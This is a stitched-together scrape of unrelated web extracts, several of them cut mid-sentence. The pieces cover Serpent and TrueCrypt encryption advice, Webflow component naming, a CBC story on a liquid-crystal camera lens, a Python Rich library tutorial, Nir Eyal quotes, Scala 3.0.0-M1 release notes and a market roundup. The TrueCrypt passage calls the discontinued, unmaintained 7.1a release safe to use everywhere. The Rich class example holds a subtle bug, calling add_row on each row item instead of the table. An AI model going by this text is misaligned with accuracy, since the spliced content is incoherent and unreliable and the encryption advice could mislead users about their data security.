<p><a href="https://en.wikipedia.org/wiki/Serpent_(cipher)">Serpent</a> was part of the finalists of the <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard_process">AES competition</a>. It was judged to be the most secure algorithm of them all, but <a href="https://www.schneier.com/wp-content/uploads/2016/02/paper-twofish-final.pdf">was discarded due to its speed</a>. However 20 years later, the computational power of everything exploded. Today the difference in speed between AES and Serpent doesn’t matter anymore, however the  difference in security still does. This is part of the reason why you should use Serpent everywhere ;)</p>
<p><strong>Truecrypt</strong></p>
<p>Truecrypt is an awesome tool that has been proved to be <a href="https://en.wikipedia.org/wiki/TrueCrypt#Legal_cases">complicated to break</a>. The tool was suddenly discontinued in 2014 in what seemed to be due to <a href="https://www.reddit.com/r/sysadmin/comments/26pxol/truecrypt_is_dead/">third party pressure</a>. An independent audit was financed by the <a href="https://www.opencryptoaudit.org/">community</a> in 2013. The <a href="https://opencryptoaudit.org/reports/TrueCrypt_Phase_II_NCC_OCAP_final.pdf">summary</a> was released in 2015, showing “no evidence of deliberate backdoors, or any severe design flaws that will make the software insecure in most instances”.</p>
<p>Given that it’s complicated/impossible to break, that it’s been audited without any security flaw found, and the pressure put on the developers to stop the project: <strong>it’s safe to say that you should use it everywhere</strong>.</p>
<p>You can find Truecrypt <a href="https://github.com/DrWhax/truecrypt-archive">here</a>, the last version is 7.1a. Use the 3 ciphers cascade encryption mode.</p>
<p>If you use the hidden volume feature, be careful with older backup versions of your file container. The difference between the older version of the container and the newer version will reveal the use of an hidden volume (bytes will change where there is supposedly no data). Try to backup the content of your container inside a new one, so  that there is no match at all between the backups and the original container.</p>
<p><strong>Password</strong></p>
<p>The last line of defense for your data is your password. Depending on the system you are using, the encryption key will be encrypted using your password, or …</p></div></div>

should be distinguished using distinct class names. Using distinct templates for all the variations of a component can become excessive. At some point modifier classes for things like shading or enabling/disabling left/right icons might be easier to maintain. Those modifier classes should then be documented clearly and considered a contract between the webflow developer and the javascript developer which requires discussion to change, to avoid surprises.</span></span></span></p><div data-slate-void="true" data-key="11266183e88b4aebadf1bf67f8356125"><div><figure data-key="11266183e88b4aebadf1bf67f8356125" contenteditable="false"><div><p><img tabindex="0" src="https://gblobscdn.gitbook.com/assets%2F-Ly4_F7g57KhwwrcB8r3%2F-MMa1sWfXwWi2gI_e3vO%2F-MMa2sXKFr2Ls2Kf_7lX%2FScreenshot_2020-11-20_16-28-34.png?alt=media&amp;token=fc9d1cfb-ac09-464d-bcba-05643766ffaf" loading="lazy"></p></div></figure></div></div><div data-slate-void="true" data-key="9e8a03bd2a6c4b889cfec0f35589b039"><div><figure data-key="9e8a03bd2a6c4b889cfec0f35589b039" contenteditable="false"><div><p><img tabindex="0" src="https://gblobscdn.gitbook.com/assets%2F-Ly4_F7g57KhwwrcB8r3%2F-MMa1sWfXwWi2gI_e3vO%2F-MMa2p1RRFi_0makoS4H%2FScreenshot_2020-11-20_16-29-08.png?alt=media&amp;token=42701502-d02a-46bc-8c26-ad4ed204924f" loading="lazy"></p></div></figure></div></div><p data-key="bee6504eb8274091adf77db3d11c61ac"><span><span data-key="c0070be3a0b54629baf918a46803dbf2"><span data-offset-key="c0070be3a0b54629baf918a46803dbf2:0"><span data-slate-zero-width="n">​</span></span></span></span></p><h2 id="best-practices-1" data-key="4a088f5387344c24b7d35deb72cefaed"><p><span><span data-key="cb2655639c3b4de1aeb6045c056fb0a8"><span data-offset-key="cb2655639c3b4de1aeb6045c056fb0a8:0">Best practices</span></span></span><a href="#best-practices-1" contenteditable="false"><span><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></p></h2><ul data-key="96662cfa833f430893e82a681cb1b76d"><li><p data-key="d1fc4aa4d4824744b4addfc69cc0dc67"><span><span data-key="da7463196fe7426b92aa1b3bf879d19d"><span data-offset-key="da7463196fe7426b92aa1b3bf879d19d:0">Use unique class names for each variation of a component.</span></span></span></p></li><li><p data-key="b9b7e45600b7454b81d62ee012b19b26"><span><span data-key="f897b625d2234988a194101a0fe3fdd5"><span data-offset-key="f897b625d2234988a194101a0fe3fdd5:0">Never access variations of a component using some kind of n-th lookup like javascript </span><span data-offset-key="f897b625d2234988a194101a0fe3fdd5:1"><code spellcheck="false" data-slate-leaf="true">matches[2]</code></span><span data-offset-key="f897b625d2234988a194101a0fe3fdd5:2"> or jQuery </span><span data-offset-key="f897b625d2234988a194101a0fe3fdd5:3"><code spellcheck="false" data-slate-leaf="true">$(".components .link-block:eq(2)")</code></span><span data-offset-key="f897b625d2234988a194101a0fe3fdd5:4"> since updates to the component library can result in surprise changes in the arrangement of template components.</span></span></span></p></li><li><p data-key="5aa051891eb24c9d817e96558a170c67"><span><span data-key="097251ff00754e9e8586b6f7588dc0f5"><span data-offset-key="097251ff00754e9e8586b6f7588dc0f5:0">Do not use IDs on cloned components - that will require the javascript developer to strip the ID after cloning and might have unintended consequences.

That's because the cameras in smartphones are&nbsp;unable to replicate the physical movement of an adjustable lens as seen with digital single-lens reflex (DSLR) cameras.&nbsp;</p>  <p>This physical manipulation lens still relies on 16th century Galilean optics, an archaic system that has not been reimagined — until now. Scope CEO Holden Beggs says the new technology the team has come up with has modernized the current lens system. It&nbsp;applies electrical fields to liquid crystals enabling a high quality zoomed image without any physical movement.&nbsp;</p>  <p>"If you think about whenever you try to take a photo, especially when you want to zoom in and take a photo, when you pinch the zoom, that photo gets blurry, it gets pixilated; and it's because all your phone is essentially doing is using software that just crops the photo, it's not actually keeping that high quality," Beggs told CBC News.</p>  <p>"What our technology means is you'll be able to zoom to take consistently sharp photos, it means you'll be able to take different kinds of photos … and you can do it without having a bunch of cameras on the back of your phone, just one that can do everything."</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5808073.1605800706!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/scope.jpg 300w,https://i.cbc.ca/1.5808073.1605800706!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/scope.jpg 460w,https://i.cbc.ca/1.5808073.1605800706!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/scope.jpg 620w,https://i.cbc.ca/1.5808073.1605800706!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/scope.jpg 780w,https://i.cbc.ca/1.5808073.1605800706!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/scope.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5808073.1605800706!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/scope.jpg"></p></div><figcaption>Scope CEO Holden Beggs says the new technology has modernized the current lens system and applies electrical fields to liquid crystals enabling a high quality zoomed image without any physical movement. <!-- --> <!-- -->(Dyson Canada Ltd.)</figcaption></figure></span></p>  <h2>'Impressive invention'</h2>  <p>Explaining how the Scope lens works, Beggs said when different fields are applied, the crystals reorient and change shape, mimicking a physical zoom system — a perfect integration and replacement of current smartphone lenses.</p>  <p>"It's a great invention because it solves a problem that has really been plaguing optics and cameras," he said.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5808070.1605800590!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/scope.jpg 300w,https://i.cbc.ca/1.5808070.1605800590!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/scope.jpg 460w,https://i.cbc.ca/1.5808070.1605800590!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/scope.jpg 620w,https://i.cbc.ca/1.5808070.1605800590!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/scope.jpg 780w,https://i.cbc.ca/1.5808070.1605800590!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/scope.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5808070.1605800590!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/scope.jpg"></p></div><figcaption>UW’s engineering team surpassed more than 1,800 international applicants in 27 countries with their invention.<!-- --> <!-- -->(Dyson Canada Ltd.)</figcaption></figure></span></p>  <p>The students recently won the international runner up prize and $8,500 for the James Dyson Award (JDA), a global annual design competition to encourage students to engineer inventions to some of the world's largest problems.&nbsp;</p>  <p>UW's engineering team beat out more than 1,800 international applicants in 27 countries with their invention.</p>  <p>Peter Gammack, Dyson's vice president of new product innovation, called Scope "an impressive invention" in a release.</p>  <p>"Not only is it a low compact and cost-effective solution, it also has the potential to be used in a variety&nbsp;of product applications. I was also impressed that the team used simulation techniques in&nbsp;conjunction with practical experiments to develop the concept," Gammack said.</p>  <p>Beggs said it will be a few years before the Scope lens is rolled out on smartphones.</p>  <p>"The smartphone cycle is quite long. A company like Apple for instance is working on a smartphone that is coming after the smartphone that is coming after the one coming out next," he said.</p>  <p>"It's a very long process to get technology to a smartphone."</p>  <p><span><span><iframe src="https://www.youtube.com/embed/gEe3zxJ4_Lc" frameborder="no" title="YouTube content" allowfullscreen=""></iframe></span></span></p></span></p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Recently I've been working on a few internal tools for my company, Teclado. Things like web scrapers to collect data and store it in a database, or simple tools to make people's jobs easier.</p>
<p>Because these are intended for a very small audience who are doing very specific tasks, I normally make console applications. And console applications can be tricky to use (and look hideous) most of the time.</p>
<p><strong>Rich</strong> is a Python library that changes that completely. My new console apps are a joy to use, look great, and it's super easy to create them.</p>
<p>In this post, let me tell you about Rich and how I've been using it. I'm not a Rich expert by any means, but I hope it helps!</p>
<h2>A Rich Example</h2>
<p>The <a href="https://rich.readthedocs.io/en/latest/introduction.html">Rich documentation</a> is excellent, so I'll just give you a quick example of the sorts of things you can do with it.</p>
<pre><code><span>from</span> rich <span>import</span> <span>print</span>
<span>from</span> rich.prompt <span>import</span> Prompt

name = Prompt.ask(
    <span>"What is your name?"</span>,
    choices=[<span>"Jose"</span>, <span>"Adam"</span>, <span>"Jen"</span>]
)

helped = <span>50</span>  
print(<span>f"You have helped [bold green]<span>{helped}</span>[/] students this week! :muscle:"</span>)</code></pre>
<p>The output of this code is this:</p>
<p><img src="https://jslvtr.com/images/better-python-console-apps-with-rich/prompting.gif" alt="Terminal demo of the Prompt code"></p>
<p>Sadly, Windows support for emojis in the terminal is extremely subpar. It works well on Mac, though!</p>
<p>You can see that Rich does a lot for you already, such as limiting choices in prompts, or support for colours and styles in text using a BBCode-like syntax.</p>
<p>There's more though!</p>
<h2>Tables with Rich</h2>
<p>By far one of my favourite features of Rich is <em>Tables</em>. I'm using tables for all sorts of stuff in my console apps, and I find myself doing the same pattern over and over:</p>
<ul>
<li>Clear the console</li>
<li>Add a table row</li>
<li>Draw the table</li>
</ul>
<p>With this pattern, tables can look like they're growing over time, effectively making your console window into a standalone app.</p>
<p><img src="https://jslvtr.com/images/better-python-console-apps-with-rich/tables-demo.gif" alt="Terminal demo of growing tables"></p>
<p>For example, recently I was writing a scraper for house prices nearby (I'm thinking of moving), and I naturally wanted to display the house information, price, and so forth. Nothing better than a table for this, so I got to writing:</p>
<pre><code><span>import</span> requests
<span>from</span> bs4 <span>import</span> BeautifulSoup
<span>from</span> rich.console <span>import</span> Console
<span>from</span> rich.table <span>import</span> Table

console = Console()
page = requests.get(RIGHTMOVE_URL).content
soup = BeautifulSoup(page)


property_table = Table()
property_table.add_column(<span>"Address"</span>, style=<span>"bold"</span>)
property_table.add_column(<span>"Rooms"</span>)
property_table.add_column(<span>"Price"</span>)

<span>for</span> property <span>in</span> properties:
    property_table.add_row(property[<span>0</span>], str(property[<span>1</span>]), str(property[<span>2</span>]))

console.print(property_table)</code></pre>
<p>That's how easy it is to draw a table using Rich! It doesn't have dynamic growing, but all you have to do to make a table grow dynamically is clear the console and re-create the table each time, with increasing numbers of rows.</p>
<p>That could be particularly useful if we had to scrape each property's page to get more information. If we did that, the table could grow as we scrape, which would be awesome!</p>
<h2>Adapting Classes to Rich</h2>
<p>Another great thing about Rich (especially if you're making applications that specifically output to a Rich <code>Console</code>), is that your classes can become <code>Renderable</code>. Then you can just print them, and Rich will display them in the format you choose.</p>
<p>For example, you could make a class like this one:</p>
<pre><code><span>from</span> rich.console <span>import</span> Console, ConsoleOptions, RenderResult
<span>from</span> rich.table <span>import</span> Table


<span><span>class</span> <span>PropertyTable</span>:</span>
    <span><span>def</span> <span>__init__</span>(<span>self</span>):</span>
        self._properties = []

    <span><span>def</span> <span>__len__</span>(<span>self</span>):</span>
        <span>return</span> len(self._properties)

    <span><span>def</span> <span>append</span>(<span>self, prop</span>):</span>
        self._properties.append(prop)

    <span><span>def</span> <span>pop</span>(<span>self</span>):</span>
        <span>return</span> self._properties.pop()

    <span><span>def</span> <span>clear</span>(<span>self</span>):</span>
        self._properties.clear()

    <span><span>def</span> <span>__rich_console__</span>(<span>self, console: Console, options: ConsoleOptions</span>) -&gt; RenderResult:</span>
        properties = Table(expand=<span>True</span>)
        properties.add_column(<span>"Address"</span>)
        properties.add_column(<span>"Rooms"</span>, style=<span>"bold"</span>)
        properties.add_column(<span>"Price"</span>, style=<span>"bold green"</span>)

        <span>for</span> prop <span>in</span> self._properties:
            prop.add_row(prop[<span>0</span>], str(prop[<span>1</span>]), str(prop[<span>2</span>]))

        <span>yield</span> properties</code></pre>
<p>And when printed using a Rich <code>Console</code>, that shows a table with a row per item in the <code>_properties</code> list.</p>
<h2>Better Logging and Tracebacks with Rich</h2>
<p>Rich can do many other things for you, but another good one is that it can make it easier to read tracebacks and errors. Just do this:</p>
<pre><code><span>from</span> rich.traceback <span>import</span> install
install()</code></pre>
<p>And from then on, your tracebacks will look like this:</p>
<p><img src="https://github.com/willmcgugan/rich/raw/master/imgs/traceback.png" alt="Screenshot of Rich tracebacks"></p>
<p>Image taken directly from the <a href="https://github.com/willmcgugan/rich">Rich GitHub page</a> (which by the way, is great).</p>
<h2>Conclusion</h2>
<p>If you make console apps, as most of us Python developers do, I really recommend installing and using Rich! It'll make your apps easier to code and use.</p>
<p>Thank you for reading!</p>

<h4>About Nir Eyal</h4>



<p>Nir Eyal is an Israeli-born American author, lecturer, and investor.  Previously, he taught as a Lecturer in Marketing at the Stanford Graduate School of Business and Design School and I’ve sold two technology companies since 2003. </p>



<p>Nir Eyal is the bestselling author of <a href="https://www.amazon.com/gp/product/1591847788/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=motiveex-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=1591847788&amp;linkId=efb3c5480d3cd5d001553869edce302c"><em>Hooked: How to Build Habit-Forming Products</em></a> and <a href="https://www.amazon.com/gp/product/194883653X/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=motiveex-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=194883653X&amp;linkId=4e87049bcf3c51d2ef9828baac46fd9b"><em>Indistractable: How to Control Your Attention and Choose Your Life</em></a>. </p>



<p>Years of studying successful startups led to insights about influencing consumer behavior. And then, these insights were codified in the Hook model: a cycle of events, engineered to keep users coming back. </p>



<p> Hooked is ideal for businesses that build products that require ongoing, unprompted user engagement, and therefore need to build user habits within the product to thrive. It is a perfect read for startup founders, visionaries, innovators, but also established corporations who aim to understand how products influence our behavior and use habits for good.

<h4>Nir Eyal Quotes</h4>



<p>Here are the most powerful success lessons from the Nir Eyal quotes:</p>



<blockquote><p>Users who continually find value in a product are more likely to tell their friends about it.</p><cite><strong> Nir Eyal </strong></cite></blockquote>



<blockquote><p>Many innovations fail because consumers irrationally overvalue the old while companies irrationally overvalue the new.</p><cite><strong> Nir Eyal </strong></cite></blockquote>



<blockquote><p>Products that require a high degree of behavior change are doomed to fail.</p><cite> <strong> Nir Eyal </strong> </cite></blockquote>



<blockquote><p>To change behavior, products must ensure the user feels in control. People must want to use the service, not feel they have to.</p><cite> <strong> Nir Eyal </strong> </cite></blockquote>



<blockquote><p>The Hook Model is designed to connect the user’s problem with the designer’s solution frequently enough to form a habit. It is a framework for building products that solve user needs through long-term engagement.</p><cite> <strong> Nir Eyal </strong> </cite></blockquote>



<blockquote><p>Make your product so simple that users already know how to use it, and you’ve got a winner.</p><cite> <strong> Nir Eyal </strong> </cite></blockquote>



<blockquote><p>Companies who form strong user habits enjoy several benefits to their bottom line.</p><cite> <strong> Nir Eyal </strong> </cite></blockquote>



<blockquote><p>the first place for the entrepreneur or designer to look for new opportunities is in the mirror.</p><cite><strong>Nir Eyal </strong> </cite></blockquote>



<blockquote><p>Fun is looking for the variability in something other people don’t notice. It’s breaking through the boredom and monotony to discover its hidden beauty.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>For some businesses, forming habits is a critical component to success, but not every business requires habitual user engagement.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Instead of relying on expensive marketing, habit-forming companies link their services to the users’ daily routines and emotions.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>When users start to automatically cue their next behavior, the new habit becomes part of their everyday routine.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>The ultimate goal of a habit-forming product is to solve the user’s pain by creating an association so that the user identifies the company’s product or service as the source of relief.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>there are three ingredients required to initiate any and all behaviors: (1) the user must have sufficient motivation; (2) the user must have the ability to complete the desired action; and (3) a trigger must be present to activate the behavior.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>“Habit Testing.” It is a process inspired by the build-measure-learn methodology championed by the lean startup movement. Habit Testing offers insights and actionable data to inform the design of habit-forming products. It helps clarify who your devotees are, what parts of your product are habit-forming (if any), and why those aspects of your product are changing user behavior.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Internet is, “a giant machine designed to give people what they want.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Habit-forming products often start as nice-to-haves (vitamins) but once the habit is formed, they become must-haves (painkillers).</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>For an infrequent action to become a habit, the user must perceive a high degree of utility, either from gaining pleasure or avoiding pain. </p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>So why haven’t more Google users switched to Bing? Habits keep users loyal. If a user is familiar with the Google interface, switching to Bing requires cognitive effort. Although many aspects of Bing are similar to Google, even a slight change in pixel placement forces the would-be user to learn a new way of interacting with the site. Adapting to the differences in the Bing interface is what actually slows down regular Google users and makes Bing feel inferior, not the technology itself.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>We often think the Internet enables you to do new things … But people just want to do the same things they’ve always done.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Users take their technologies with them to bed.[cxiv] When they wake up, they check for notifications, tweets, and updates, sometimes even before saying “Good morning” to their loved ones.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Once a technology has created an association in users’ minds that the product is the solution of choice, they return on their own, no longer needing prompts from external triggers.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Variable rewards are one of the most powerful tools companies implement to hook users</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<pre></pre>



<blockquote><p>You are now equipped to use the Hook Model to ask yourself these five fundamental questions for building effective hooks:   1.   What do users really want? What pain is your product relieving? (Internal Trigger) 2.   What brings users to your service? (External Trigger) 3.   What is the simplest action users take in anticipation of reward, and how can you simplify your product to make this action easier? (Action) 4.   Are users fulfilled by the reward, yet left wanting more? (Variable Reward) 5.   What “bit of work” do users invest in your product? Does it load the next trigger and store value to improve the product with use? (Investment)</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Who is on a team matters less than how the team members interact, structure their work, and view their contributions.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>To receive fewer emails, we must send fewer emails.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>There are many counterintuitive and surprising ways companies can boost users’ motivation or increase their ability by understanding heuristics—the mental shortcuts we take to make decisions and form opinions.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>If you were to walk around Slack’s company headquarters in San Francisco, you’d notice a peculiar slogan on the hallway walls. White letters on a bright pink background blare, “Work hard and go home.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>The goal is to eliminate all white space on your calendar so you’re left with a template for how you intend to spend your time each day.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Motivation or Ability — Which Should You Increase First? After uncovering the triggers that prompt user actions and deciding which actions you want to turn into habits, you can increase motivation and ability to spark the likelihood of your users taking a desired behavior. But which should you invest in first, motivation or ability? Where is your time and <a href="https://motiveex.com/tag/wealth/">money</a> better spent? The answer is always to start with ability.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Building habit-forming products is an iterative process and requires user behavior analysis and continuous experimentation.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>However, products utilizing infinite variability stand a better chance of holding on to users’ attention, while those with finite variability must constantly reinvent themselves just to keep pace.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Many entrepreneurs fall into the trap of building products that are only marginally better than existing solutions, hoping their innovation will be good enough to woo customers away from existing products. But when it comes to shaking consumers’ old habits, these naive entrepreneurs often find that better products don’t always win—especially if a large number of users have already adopted a competing product.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Companies fail to change user behaviors because they do not make their services enjoyable for its own sake, often asking users to learn new, unfamiliar actions instead of making old routines easier.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>

    <p>November 2020 brings an important milestone for Scala 3 – the release of Scala 3.0.0-M1. This milestone release is a precursor to the Scala 3.0.0 release candidate planned for the end of the year – which is as little as 6 weeks from now! Later on, the release candidate is planned to evolve into 3.0.0 stable release in February 2021.</p>
<p>Once 3.0.0 release candidate is out, no new features or breaking changes will take place on 3.0.x – it will only be updated for bug fixes. However, we are going to continue the work on making the language better and to test out our research in it. These changes will end up in Scala only as of 3.1.0.</p>
<p>For now though, our teams are focusing the efforts on getting done with the remainder of the 40-something projects that we planned for the upcoming release back in July 2020. Many of them are already completed. Those that aren't yet – get revised and re-planned. With the current global uncertainty and with the scale of the project, we cannot be certain, but we believe we have a reasonable chance of releasing 3.0.0-RC1 by Christmas.</p>
<p>Below, you can find a short summary of the changes that took place during between the 0.27.0-RC1 and 3.0.0-M1 releases.</p>
<!--more-->

<p>Dotty 0.27.0-RC1 had introduced preliminary Scala.js support with the portable subset of Scala and native JavaScript types.
Scala 3.0.0-M1 significantly expands on that support:</p>
<ul>
<li>support for non-native JS types (<a href="https://github.com/lampepfl/dotty/pull/9774">#9774</a>), and</li>
<li>better support for other JS interop features, notably their interactions with Scala 3 features such as top-level declarations and <code>enum</code>s (e.g, <a href="https://github.com/lampepfl/dotty/pull/9725">#9725</a> and <a href="https://github.com/lampepfl/dotty/pull/9955">#9955</a>).</li>
</ul>
<p>The only remaining feature of Scala.js that is not supported yet is JS exports: <code>@JSExport</code> and its siblings <code>@JSExportAll</code>, <code>@JSExportTopLevel</code> and <code>@JSExportStatic</code> are all ignored by Scala 3.0.0-M1.
Support for JS exports will come in the next release.</p>
<p>For related reading, you can learn more on what it took to <a href="https://www.scala-lang.org/2020/11/03/scalajs-for-scala-3.html">implement Scala.js support in Scala 3 on our blog</a>.</p>

<p>As the title suggests, this change is fairly straightforward. Now, instead of:</p>
<pre><code>x match {
  case Foo(y @ Bar(z)) =&gt; println(y)
}
</code></pre>
<p>You can write:</p>
<pre><code>x match {
  case Foo(y as Bar(z)) =&gt; println(y)
}
</code></pre>
<p>As of Scala 3.1.0, the <code>@</code> syntax will be deprecated and the codebases should switch to <code>as</code> instead.</p>
<p>This change was implemented by PR <a href="https://github.com/lampepfl/dotty/pull/9837">#9837</a>.</p>

<p>The syntax for <code>given</code> instances in patterns has also changed. In the <code>for</code>-comprehensions, the correct way of using <code>given</code>s is as follows:</p>
<pre><code>for given Context &lt;- applicationContexts do
</code></pre>
<p>And in <code>match</code> clauses, you can use them as follows:</p>
<pre><code>pair match
  case (ctx as given Context, y) =&gt; ...
</code></pre>
<p>For more information, see <a href="https://dotty.epfl.ch/docs/reference/contextual/givens.html#pattern-bound-given-instances">documentation</a>, and for discussion, see PR <a href="https://github.com/lampepfl/dotty/pull/10091">#10091</a>.</p>

<p>This is another syntactic change which aims to simplify the code. Instead of:</p>
<pre><code>import p.{given _}
</code></pre>
<p>The correct version of the wildcard <code>given</code> import now becomes:</p>
<pre><code>import p.given
</code></pre>
<p>This change was implemented by PR <a href="https://github.com/lampepfl/dotty/pull/9949">#9949</a>.</p>

<p><code>enum</code> definitions are now released in their final design. since <code>0.27.0-RC1</code> we have made the following changes:</p>
<p>For the enum definition of Option:</p>
<pre><code>enum Opt[+T] {
  case Sm(value: T)
  case Nn
}
</code></pre>
<p>we will now generate on the companion objects of class cases <code>apply</code> and <code>copy</code> methods with the precise subtype:</p>
<pre><code>object Sm {
  ...
  def apply[T](value: T): Sm[T]
  ...
}
</code></pre>
<p>however expressions that call <code>apply</code> or <code>copy</code> will be widened to the parent enum type unless the precise type is expected, as we see here:</p>
<pre><code>scala&gt; Sm(23)
val res0: Opt[Int] = Sm(23)

scala&gt; val sm: Sm[23] = Sm(23)
val sm: Opt.Sm[23] = Sm(23)
</code></pre>
<p>Previously, when an enumeration declared cases with value parameters, such as <code>Opt.Sm</code>, then the <code>Opt.values</code> array would no longer have indexes that match the enum case ordinals. We feel that this is problematic, so the <code>values</code> and <code>valueOf</code> methods will only be generated when an enum has exclusively singleton cases.</p>
<p>If an enumeration adds a case with value parameters, then consumers will recieve an error that explains why <code>values</code> has been removed.</p>
<pre><code>scala&gt; Opt.values
1 |Opt.values
  |^^^^^^^^^^
  |value values is not a member of object Opt.
  |Although class Opt is an enum, it has non-singleton cases,
  |meaning a values array is not defined
</code></pre>
<p>For code that previously relied upon <code>values</code> to lookup singleton cases, we now provide an optimised method <code>fromOrdinal</code> that reflects singleton values. This method is always generated:</p>
<pre><code>scala&gt; Opt.fromOrdinal(1)
val res1: Opt[?] = Nn
</code></pre>

<p>Following the discussion on <a href="https://contributors.scala-lang.org/t/the-alpha-notation/4583">contributors</a>, we now keep <code>@alpha</code> optional for operators. The checking behavior is still available when compiling with the <code>-Yrequire-alpha</code>.</p>
<p><code>@alpha</code> annotations provide a way to define an alternate name for symbolic operators. You can learn more about <code>@alpha</code> annotations from the <a href="https://dotty.epfl.ch/docs/reference/changed-features/operators.html#the-alpha-annotation">documentation</a>. The change was implemented by PR <a href="https://github.com/lampepfl/dotty/pull/10093">#10093</a>.</p>

<p>During the last months, a considerable amount of effort went into investigating performance bottlenecks in the compiler and optimizing its workflow. We also work on stabilizing the compiler and porting relevant changes from the Scala 2 compiler to Scala 3. The following PRs are relevant to highlighting this work:</p>
<ul>
<li>Port classfile parsing improvements <a href="https://github.com/lampepfl/dotty/pull/10037">#10037</a></li>
<li>Semanticdb usability enhancements <a href="https://github.com/lampepfl/dotty/pull/9768">#9768</a></li>

<p>This release of Scala 3 doesn't work on JDK 14 because of a regression fixed in <a href="https://github.com/lampepfl/dotty/pull/10135">#10135</a>. JDK 15 doesn't work either because of <a href="https://github.com/scala/bug/issues/12172">scala/bug#12172</a> which will be fixed in the new scala-library release.</p>

                    <h2 id="a-week-in-summary-hype-value-hyper-hype-vs-hyper-growth">A week in summary: Hype = Value? Hyper hype VS Hyper growth</h2><p><br>A bit of market frenzy this week and US election conspiracy with the timing of Pfizer and BioNTech announcement of a COVID-19 vaccine. A vaccine that could bank them <a href="https://www.theguardian.com/business/2020/nov/10/pfizer-and-biontech-could-make-13bn-from-coronavirus-vaccine">$13 billion next year</a> and speed of development. The FTSE 100 jumped by 5% whilst Zoom (-15%), Peloton (-7%) and Netflix (-5%) fell. Perhaps more people would still prefer to go back to their Friday night drinks and in-person gym experiences over online <a href="https://www.theverge.com/2020/11/11/21559541/beyonce-peloton-themed-class-music-bike-treadmill-lawsuit-settled">Beyonce X Peloton classes</a>.<br></p><div><p><strong>Hyper hype hype</strong></p><p>On the other side of the market, Supreme was acquired this week for $2.1 billion by <a href="https://www.cnbc.com/2020/11/09/vans-owner-vf-corp-to-buy-streetwear-brand-supreme-for-2point1-billion.html">VF Corp</a>. This brings them into the fold of a company who owns Timberland, The North Face and Vans. They are <a href="https://trapital.co/2020/11/10/memo-014-hip-hops-next-era">a firm with experience</a> in extending the shelf of mass market brands but it is to be seen whether Supreme’s brand will extend well into the mass market. Whilst resale prices may be high for Supreme products on the secondary market, going to the masses can be profitable. Last year when Yeezy began to go to the mass market they saw a <a href="https://footwearnews.com/2019/business/athletic-outdoor/yeezy-mass-release-sales-2019-1202736706/">500% increase in sales</a> and also a $1.3 billion deal with GAP this year. </p></div><div><p>The market continued as a hypebeast continued this week with viral digital products studio MSCHF claiming to raise a seed round of $200 million for <a href="https://techcrunch.com/2020/11/09/mschfs-push-party-raises-an-unconventional-round-at-a-200-million-valuation">PushParty</a>, an app with a FOCUS on doing one thing only. If you press the big red button on the app, you send a notification to everyone with the app installed. Perhaps being a hypebeast can be quite a lucrative career 